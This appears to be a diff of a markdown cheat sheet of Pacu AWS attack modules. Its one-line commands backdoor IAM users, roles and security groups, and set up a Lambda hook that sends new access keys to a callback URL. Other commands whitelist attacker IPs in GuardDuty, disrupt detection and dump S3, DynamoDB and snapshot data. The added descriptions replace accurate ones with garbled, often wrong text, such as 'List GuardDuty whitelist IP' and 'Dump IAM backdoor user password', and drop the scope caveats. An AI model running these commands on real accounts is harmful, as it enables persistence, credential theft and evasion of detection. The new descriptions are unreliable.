-Restore and attach EBS volumes or snapshots to a supplied EC2 instance for mounted filesystem review.
+Run EBS explore snapshots with Pacu.
 
-```sh title:"Pacu explore EBS snapshots"
+```sh title:"Pacu Run EBS Explore Snapshots"
 run ebs__explore_snapshots --instance-id "$aws_instance_id"
 ```
 <!-- cheat
@@ -1032,18 +1032,18 @@ var aws_instance_id
 
 ### RDS explore snapshots
 
-Create temporary RDS snapshot copies, restore them, change the master password, and print connection info.
+Run RDS explore snapshots with Pacu.
 
-```sh title:"Pacu explore RDS snapshots"
+```sh title:"Pacu Run RDS Explore Snapshots"
 run rds__explore_snapshots
 ```
 <!-- cheat -->
 
 ### EC2 startup shell script
 
-Stop and restart selected EC2 instances after updating user data with a supplied shell script.
+Start EC2 startup shell script with Pacu.
 
-```sh title:"Pacu EC2 startup shell script"
+```sh title:"Pacu Start EC2 Startup Shell Script"
 run ec2__startup_shell_script --script "$aws_userdata_script_file"
 ```
 <!-- cheat
@@ -1052,27 +1052,27 @@ var aws_userdata_script_file
 
 ### ECS backdoor task definition
 
-Create or modify ECS task definition execution paths where persistence testing is explicitly in scope.
+Run ECS backdoor task definition with Pacu.
 
-```sh title:"Pacu backdoor ECS task definition"
+```sh title:"Pacu Run ECS Backdoor Task Definition"
 run ecs__backdoor_task_def
 ```
 <!-- cheat -->
 
 ### Lightsail default keys
 
-Download Lightsail default SSH key pairs where allowed.
+Download lightsail default keys with Pacu.
 
-```sh title:"Pacu download Lightsail default SSH keys"
+```sh title:"Pacu Download Lightsail Default Keys"
 run lightsail__download_ssh_keys
 ```
 <!-- cheat -->
 
 ### Lightsail temporary access
 
-Create temporary SSH keys for Lightsail instances and download them into the session downloads directory.
+Generate lightsail temporary access with Pacu.
 
-```sh title:"Pacu generate Lightsail temporary SSH access"
+```sh title:"Pacu Generate Lightsail Temporary Access"
 run lightsail__generate_temp_access
 ```
 <!-- cheat -->
@@ -1081,18 +1081,18 @@ run lightsail__generate_temp_access
 
 ### S3 enumerate bucket names
 
-Enumerate S3 buckets and store bucket metadata without downloading object contents.
+Dump S3 enumerate bucket names with Pacu.
 
-```sh title:"Pacu enumerate S3 bucket names"
+```sh title:"Pacu Dump S3 Enumerate Bucket Names"
 run s3__download_bucket --names-only
 ```
 <!-- cheat -->
 
 ### S3 download specific buckets
 
-Download object contents for selected bucket names.
+Download S3 download specific buckets with Pacu.
 
-```sh title:"Pacu download selected S3 buckets"
+```sh title:"Pacu Download S3 Download Specific Buckets"
 run s3__download_bucket --dl-names "$s3_bucket_names"
 ```
 <!-- cheat
@@ -1101,36 +1101,36 @@ var s3_bucket_names
 
 ### S3 download bucket workflow
 
-Run the interactive S3 download workflow and choose which accessible buckets to download.
+Download S3 download bucket workflow with Pacu.
 
-```sh title:"Pacu interactive S3 bucket download"
+```sh title:"Pacu Download S3 Download Bucket Workflow"
 run s3__download_bucket
 ```
 <!-- cheat -->
 
 ### EBS direct snapshot download
 
-Download EBS snapshots with the EBS direct API for offline mounting and review.
+Download EBS direct snapshot download with Pacu.
 
-```sh title:"Pacu download EBS snapshots"
+```sh title:"Pacu Download EBS Direct Snapshot Download"
 run ebs__download_snapshots
 ```
 <!-- cheat -->
 
 ### DynamoDB enum and dump
 
-Enumerate DynamoDB tables and dump table values where allowed.
+Dump DynamoDB enum and dump with Pacu.
 
-```sh title:"Pacu enumerate and dump DynamoDB"
+```sh title:"Pacu Dump DynamoDB Enum and Dump"
 run dynamodb__enum
 ```
 <!-- cheat -->
 
 ### CloudFormation template loot
 
-Download CloudFormation templates and exports for offline secret review.
+Dump CloudFormation template loot with Pacu.
 
-```sh title:"Pacu loot CloudFormation templates"
+```sh title:"Pacu Dump CloudFormation Template Loot"
 run cloudformation__download_data
 ```
 <!-- cheat -->
@@ -1139,36 +1139,36 @@ run cloudformation__download_data
 
 ### IAM backdoor assume role
 
-Create assume-role trust relationships between selected users and roles in scope.
+Run IAM backdoor assume role with Pacu.
 
-```sh title:"Pacu backdoor IAM assume role trust"
+```sh title:"Pacu Run IAM Backdoor Assume Role"
 run iam__backdoor_assume_role
 ```
 <!-- cheat -->
 
 ### IAM backdoor user keys
 
-Add API keys to selected IAM users in scope.
+Run IAM backdoor user keys with Pacu.
 
-```sh title:"Pacu backdoor IAM user access keys"
+```sh title:"Pacu Run IAM Backdoor User Keys"
 run iam__backdoor_users_keys
 ```
 <!-- cheat -->
 
 ### IAM backdoor user password
 
-Add console passwords to selected IAM users that do not already have login profiles.
+Dump IAM backdoor user password with Pacu.
 
-```sh title:"Pacu backdoor IAM user console passwords"
+```sh title:"Pacu Dump IAM Backdoor User Password"
 run iam__backdoor_users_password
 ```
 <!-- cheat -->
 
 ### EC2 security group backdoor
 
-Add ingress rules to selected EC2 security groups for an approved source IP.
+Run EC2 security group backdoor with Pacu.
 
-```sh title:"Pacu backdoor EC2 security groups"
+```sh title:"Pacu Run EC2 Security Group Backdoor"
 run ec2__backdoor_ec2_sec_groups --source-ip "$aws_source_ip"
 ```
 <!-- cheat
@@ -1177,9 +1177,9 @@ var aws_source_ip
 
 ### Lambda backdoor new users
 
-Create a Lambda/EventBridge rule that reacts to new IAM users and sends created access keys to a listener.
+Create lambda backdoor new users with Pacu.
 
-```sh title:"Pacu backdoor new IAM users with Lambda"
+```sh title:"Pacu Create Lambda Backdoor New Users"
 run lambda__backdoor_new_users --url "$aws_callback_url"
 ```
 <!-- cheat
@@ -1188,9 +1188,9 @@ var aws_callback_url
 
 ### Lambda backdoor new roles
 
-Create a Lambda/EventBridge rule that modifies new IAM role trust policies for an approved principal.
+Create lambda backdoor new roles with Pacu.
 
-```sh title:"Pacu backdoor new IAM roles with Lambda"
+```sh title:"Pacu Create Lambda Backdoor New Roles"
 run lambda__backdoor_new_roles --principal "$aws_principal_arn"
 ```
 <!-- cheat
@@ -1199,9 +1199,9 @@ var aws_principal_arn
 
 ### Lambda backdoor new security groups
 
-Create a Lambda/EventBridge rule that adds an approved ingress rule to new EC2 security groups.
+Create lambda backdoor new security groups with Pacu.
 
-```sh title:"Pacu backdoor new EC2 security groups with Lambda"
+```sh title:"Pacu Create Lambda Backdoor New Security Groups"
 run lambda__backdoor_new_sec_groups --source-ip "$aws_source_ip"
 ```
 <!-- cheat
@@ -1212,36 +1212,36 @@ var aws_source_ip
 
 ### Detect logging services
 
-Enumerate CloudTrail, CloudWatch, Config, Shield, VPC Flow Logs, and GuardDuty coverage.
+Enumerate detect logging services with Pacu.
 
-```sh title:"Pacu enumerate detection services"
+```sh title:"Pacu Enumerate Detect Logging Services"
 run detection__enum_services
 ```
 <!-- cheat -->
 
 ### GuardDuty accounts
 
-List GuardDuty administrator/member account links to identify lateral movement scope.
+List GuardDuty accounts with Pacu.
 
-```sh title:"Pacu list GuardDuty linked accounts"
+```sh title:"Pacu List GuardDuty Accounts"
 run guardduty__list_accounts
 ```
 <!-- cheat -->
 
 ### GuardDuty findings
 
-Download GuardDuty detector statistics and findings.
+Find GuardDuty findings with Pacu.
 
-```sh title:"Pacu list GuardDuty findings"
+```sh title:"Pacu Find GuardDuty Findings"
 run guardduty__list_findings
 ```
 <!-- cheat -->
 
 ### GuardDuty whitelist IP
 
-Add an approved source IP to GuardDuty trusted IP lists for controlled detection testing.
+List GuardDuty whitelist IP with Pacu.
 
-```sh title:"Pacu whitelist GuardDuty source IP"
+```sh title:"Pacu List GuardDuty Whitelist IP"
 run guardduty__whitelist_ip --source-ip "$aws_source_ip"
 ```
 <!-- cheat
@@ -1250,45 +1250,45 @@ var aws_source_ip
 
 ### CloudTrail event history
 
-Download CloudTrail event history JSON for approved regions. This can take a long time in busy accounts.
+Download CloudTrail event history with Pacu.
 
-```sh title:"Pacu download CloudTrail event history"
+```sh title:"Pacu Download CloudTrail Event History"
 run cloudtrail__download_event_history
 ```
 <!-- cheat -->
 
 ### CloudWatch logs
 
-Download CloudWatch log events to the Pacu session downloads directory.
+Download CloudWatch logs with Pacu.
 
-```sh title:"Pacu download CloudWatch logs"
+```sh title:"Pacu Download CloudWatch Logs"
 run cloudwatch__download_logs
 ```
 <!-- cheat -->
 
 ### Detection disruption
 
-Run Pacu's detection disruption module only when detection-control tampering is explicitly authorized.
+Run detection disruption with Pacu.
 
-```sh title:"Pacu detection disruption"
+```sh title:"Pacu Run Detection Disruption"
 run detection__disruption
 ```
 <!-- cheat -->
 
 ### ELB logging gaps
 
-Find Elastic Load Balancers without access logging enabled.
+Enumerate ELB logging gaps with Pacu.
 
-```sh title:"Pacu enumerate ELB logging gaps"
+```sh title:"Pacu Enumerate ELB Logging Gaps"
 run elb__enum_logging
 ```
 <!-- cheat -->
 
 ### WAF enum
 
-Enumerate WAF rules, rule groups, and matching sets.
+Enumerate WAF enum with Pacu.
 
-```sh title:"Pacu enumerate WAF"
+```sh title:"Pacu Enumerate WAF Enum"
 run waf__enum
 ```
 <!-- cheat -->
@@ -1297,9 +1297,9 @@ run waf__enum
 
 ### Organizations assume role
 
-Try to assume role names across organization member accounts when the caller has AssumeRole rights.
+Set organizations assume role with Pacu.
 
-```sh title:"Pacu organizations assume role"
+```sh title:"Pacu Set Organizations Assume Role"
 run organizations__assume_role --accounts "$aws_account_ids" --role-names "$aws_role_names"
 ```
 <!-- cheat
@@ -1309,9 +1309,9 @@ var aws_role_names
 
 ### SNS subscribe
 
-Attempt to subscribe an email address to an SNS topic ARN.
+Set SNS subscribe with Pacu.
 
-```sh title:"Pacu SNS subscribe"
+```sh title:"Pacu Set SNS Subscribe"
 run sns__subscribe --topic-arn "$aws_sns_topic_arn" --email "$aws_sns_email"
 ```
 <!-- cheat
@@ -1323,27 +1323,27 @@ var aws_sns_email
 
 ### Services with data
 
-List AWS services with data currently stored in the active Pacu session.
+List services with data with Pacu.
 
-```sh title:"List Pacu services with stored data"
+```sh title:"Pacu List Services with Data"
 services
 ```
 <!-- cheat -->
 
 ### Show all data
 
-Print all stored session data.
+Show all data with Pacu.
 
-```sh title:"Show all Pacu session data"
+```sh title:"Pacu Show All Data"
 data
 ```
 <!-- cheat -->
 
 ### Show service data
 
-Print stored data for one service.
+Show service data with Pacu.
 
-```sh title:"Show Pacu service data"
+```sh title:"Pacu Show Service Data"
 data "$service_name"
 ```
 <!-- cheat
@@ -1352,9 +1352,9 @@ var service_name := IAM
 
 ### Query service data with jq
 
-Run a jq expression against one service's stored data.
+Query service data with jq with Pacu.
 
-```sh title:"Query Pacu service data with jq"
+```sh title:"Pacu Query Service Data with Jq"
 jq "$service_name" "$jq_filter"
 ```
 <!-- cheat
@@ -1364,9 +1364,9 @@ var jq_filter := .
 
 ### Data from CLI
 
-Print stored data for one service from the CLI. Use `all` for the whole session.
+Show data from CLI with Pacu.
 
-```sh title:"Show Pacu service data from CLI"
+```sh title:"Pacu Show Data from CLI"
 pacu --session "$session_name" --data "$service_name"
 ```
 <!-- cheat
@@ -1376,9 +1376,9 @@ var service_name := all
 
 ### Downloads directory
 
-Open the active session downloads directory where module output is stored.
+Download downloads directory with Pacu.
 
-```sh title:"Print Pacu downloads directory"
+```sh title:"Pacu Download Downloads Directory"
 printf '%s\n' "$HOME/.local/share/pacu/sessions/$session_name/downloads"
 ```
 <!-- cheat
@@ -1387,9 +1387,9 @@ var session_name
 
 ### Command log
 
-Tail the Pacu command log for the session.
+Execute command log with Pacu.
 
-```sh title:"Tail Pacu command log"
+```sh title:"Pacu Execute Command Log"
 tail -n 100 "$HOME/.local/share/pacu/sessions/$session_name/cmd_log.txt"
 ```
 <!-- cheat
@@ -1398,18 +1398,18 @@ var session_name
 
 ### Error log
 
-Inside Pacu, print the active session error log.
+Show error log with Pacu.
 
-```sh title:"Show Pacu error log"
+```sh title:"Pacu Show Error Log"
 debug
 ```
 <!-- cheat -->
 
 ### Error log file
 
-Tail the Pacu error log for a session from the shell.
+Run error log file with Pacu.
 
-```sh title:"Tail Pacu error log file"
+```sh title:"Pacu Run Error Log File"
 tail -n 100 "$HOME/.local/share/pacu/sessions/$session_name/error_log.txt"
 ```
 <!-- cheat
